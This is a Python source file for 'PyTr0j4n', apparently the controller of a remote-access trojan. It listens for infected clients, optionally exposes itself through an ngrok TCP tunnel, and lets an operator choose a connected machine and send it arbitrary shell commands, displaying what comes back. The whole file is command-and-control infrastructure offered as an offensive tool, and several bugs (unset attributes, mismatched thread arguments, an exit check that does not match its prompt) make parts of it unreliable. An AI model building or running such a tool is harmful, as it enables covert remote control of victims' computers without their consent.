import socket
from pyngrok import ngrok
import threading
import colorama
import banners
import time

colorama.init()    

COLOR_RED = colorama.Fore.RED
COLOR_GREEN = colorama.Fore.GREEN
COLOR_YELLOW = colorama.Fore.YELLOW
COLOR_BLUE = colorama.Fore.BLUE
COLOR_CYAN = colorama.Fore.CYAN
COLOR_RESET = colorama.Style.RESET_ALL


def getUserInput():
    while True:
        print(COLOR_RESET)
        useNgrok = input("[*] Do you want to create a ngrok tunnel? (Y/N)\n")
        if useNgrok.lower() in ["y", "n"]:
            return useNgrok.lower()
        else:
            print(f"{COLOR_YELLOW}[*] Invalid option. Please enter 'y' or 'n'.\n")

class PyTr0j4n:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None
        self.serverAdress = (self.host, self.port)
        self.clients = {} #Dict to store client threads and their addresses
        self.clientIdCounter = 1 #Counter to generate client IDs

    def createNgrokTunnel(self, port):
        try:
            self.public_url = ngrok.connect(port, "tcp")
            print(f"{COLOR_GREEN}[*] Ngrok tunnel created: {self.public_url.public_url}")
        except Exception as e:
            print(f"{COLOR_RED}[*] Error creating ngrok tunnel: {e}")
            return None

    def startServer(self):
        try:
            useNgrok = getUserInput() #verifies if user wants to create a ngrok tunnel
            if useNgrok == 'y':
                self.createNgrokTunnel(self.port)
                if not self.public_url:
                    print(f"{COLOR_RED}[!] Unable to create ngrok tunnel")
                else:
                    print(f"{COLOR_GREEN}[*] Listening on {self.public_url.public_url}")
            else:
                print(f"{COLOR_GREEN}[*] Listening on {self.host}:{self.port}")

            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.bind((self.host, self.port))
            self.server.listen(5)

            #Listening connections in a thread.
            listening = threading.Thread(target=self.acceptConnections)
            #Start menu handler in a thread 
            handler = threading.Thread(target=self.handlerClient) 
            listening.start()
            handler.start()
           

        except KeyboardInterrupt:
            print(f"{COLOR_YELLOW}[!] Server is shutting down.")
            self.stopServer()
        except Exception as e:
            print(f"{COLOR_RED}[!] Error starting the server: {e}")
            self.stopServer()

    def listConnectedClients(self):
        print(f"{COLOR_GREEN}\n[*] Connected clients:")
        if not self.clients:
            print("\n...\n")
        for clientId, clientData in self.clients.items():
            clientAddress = clientData.get('address')
            print(f"{COLOR_BLUE}ID: {COLOR_CYAN}{clientId}\n{COLOR_BLUE}Address {COLOR_CYAN}{clientAddress[0]}:{clientAddress[1]}\n")

    def handlerClient(self):
        try:
            while True:
                print(f"\n{COLOR_BLUE}[Menu]\n{COLOR_CYAN}1. List connected clients\n2. Chat with a client\n")
                print(COLOR_RESET)
                choice = input(f"Enter option: ")
                if(choice == "1"):
                    self.listConnectedClients()
                elif choice == "2":
                    if not self.clients:
                        print(f"{COLOR_YELLOW}[*] No clients connected.")
                        continue

                    self.listConnectedClients()
                    try:
                        print(COLOR_RESET)
                        choiceId = int(input("Enter the client ID to connect with:\n"))
                        if choiceId not in self.clients:
                            print(f"{COLOR_RED}[!] Invalid client ID. Please try again.\n")
                    except ValueError:
                        print(f"{COLOR_RED}[!] Invalid input.\n")
                        continue
                    clientSocket = self.clients[choiceId].get('socket')
                    clientAddress = self.clients[choiceId].get('address')
                    print(f"{COLOR_BLUE}[*] Chatting with client ID {COLOR_RESET}{choiceId}{COLOR_BLUE}, Address: {COLOR_RESET} {clientAddress[0]}:{clientAddress[1]}\n")
                    self.chatClient(clientSocket, clientAddress, choiceId)
        except Exception as e:
            print(f"{COLOR_RED}[!] Error handling client: {e}")
        finally:
            clientSocket.close()
            del self.clients[choiceId]

    def chatClient(self, clientSocket, clientAddress, clientId):
        try:
            print(f"{COLOR_GREEN}[*] Accepted connection from {COLOR_RESET}{clientId} {clientAddress[0]}:{clientAddress[1]}\n")
            while True:
                response = input("[*] Enter command (or '/exit' to back to menu): \n")
                if(response.lower() == "exit"):
                    break
                clientSocket.sendall(response.encode('utf-8'))
                data = clientSocket.recv(1024)
                if not data:
                    break
                print(f"{COLOR_RESET}{data.decode('utf-8')}")
        except Exception as e:
            print(f"{COLOR_RED}[!] Error handling client: {e}")
        finally:
            clientSocket.close()
            del self.clients[clientId]

    def acceptConnections(self):
        try:
            while True:
                clientSocket, clientAddress = self.server.accept()
                clientId = self.clientIdCounter
                self.clientIdCounter += 1

                clientHandler = threading.Thread(target=self.handlerClient, args=(clientSocket, clientAddress, clientId))
                #clientHandler.start()
                #Store the client data (handler and address) with their respective ID
                self.clients[clientId] = {'handler': clientHandler, 'address': clientAddress, 'socket': clientSocket}
        except KeyboardInterrupt:
            print("{COLOR_YEALLOW}[!] Server is shutting down.")
            time.sleep(2)
            self.server.close()
        except Exception as e:
            print(f"{COLOR_RED}[!] Error accepting connections: {e}")
            time.sleep(2)
            self.server.close()

    def stopServer(self):
        try:
            print(f"{COLOR_YELLOW}[!] Stopping server...")
            if self.public_url:
                self.public_url.close()
            if self.server:
                self.server.close()
        except Exception as e:
            print(f"{COLOR_RED}[!] Error stopping the server: {e}")
    

def main():
    host = '0.0.0.0'  # Listen on all available interfaces
    port = 8888

    server = PyTr0j4n(host, port)

    print(COLOR_BLUE + banners.getBanner())
    time.sleep(2)
    print(f"\t{COLOR_BLUE}Author: {COLOR_RESET}Kayan Tchian | {COLOR_BLUE}GitHub: {COLOR_RESET}kayantchian\n")
    print(f"{COLOR_GREEN}[*] Welcome to PyTr0j4n")
    print(f"{COLOR_YELLOW}[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]\n\n")

    server.startServer()

if __name__ == "__main__":
    main()
